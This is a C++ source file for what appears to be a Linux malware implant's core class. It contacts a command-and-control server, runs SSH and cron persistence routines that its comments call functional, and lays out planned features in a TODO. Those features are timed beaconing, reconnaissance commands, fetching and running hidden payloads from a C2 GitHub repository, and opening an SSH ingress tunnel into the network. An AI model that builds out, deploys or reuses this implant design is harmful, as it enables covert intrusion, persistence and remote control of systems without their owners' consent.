// the application core class

#include "core.h"
#include <iostream>
#include <string>
#include "ssh_persistence.h"
// #include "scheduled_job_persistence.h"                           // this feature has yet to be implemented
#include "read_c2_message.h"

Core::Core() {
    std::cout << "[+] Application core initialized" << '\n';
    try {
        contact_server();
        establish_persistence();                                     // after this call, file_system_locations will be populated with the locations the file has been copied to;
        loop();
    } catch (const std::exception & e) {
        std::cout << "[!] Core::Core raised a standard exception" << e.what() << '\n';
    } catch (...) {
        std::cout << "[!] Core::Core raised an unknown error" << '\n';
    }
}

void Core::loop() {
    /* TODO
     * at this point, the implant has established C2 communication (over TLS), and the initial persistence routines have run;
     *
     * 1. conditional: if established_persistence_count < 1: scheduled_job_persistence()
     *      - scheduled_job_persistence() should establish persistence via systemd timer
     * 2. establish a loop to reach back out to the C2 channel once every 24 hours at a random interval throughout the day:
     *      - confirm contact
     *      - decode and read instruction       -> instruction should be of the form: COMMAND : file_to_stage
     *      - support instructions:
     *              - light_reconnaissance      -> grab current userid, username, kernel and OS versions, network interfaces, and recent user activity
     *                                          -> recent user activity: 
     *                                              - most recent 10 logons: "last | head -n 10"
     *                                              - processes of current logons: "w"
     *                                              - current logons: who
     *              - heavy_reconnaissance      -> grab running processes, user cronjobs, suid files, capabilities, world readable configs, list world readable home folders
     *              - run_file : file.type      -> grab the indicated file off of the C2 GH, write it to a hidden file, render it executable, and start it as a process
     *              - open_ingress_tunnel       -> open an ssh-tunnel based ingress channel into the local network
     *      
    */
    // if (established_persistence_count < 1) {scheduled_job_persistence();}
}
                                            // The TLS encryption of this request has been confirmed with Wireshark
                                            // consult for further changes: https://github.com/yhirose/cpp-httplib
void Core::contact_server() {

    std::string contact_file_contents = read_c2_message("contact.txt");

    std::string test_string = "contact has been established.";
    if (contact_file_contents == test_string) {
        std::cout << "[+] Contact has successfully been established." << '\n';
    } else {
        std::cout << "[!] There is a difference between the 2 messages." << '\n';
        exit(EXIT_FAILURE);
    }

}

void Core::establish_persistence() {
    std::cout << "[+] establish_persistence() routine initialized." << '\n' << "[+] Attempting to establish SSH and Cron based persistence" << '\n';

    // if (establish_ssh_persistence() == true) {established_persistence_count++;}                       // true if persistence is established, false otherwise
    // if (establish_crontab_persistence() == true) {established_persistence_count++;}
    //      ^^^^^ both persistence routines are functional; the code should be reviewed again before use

}
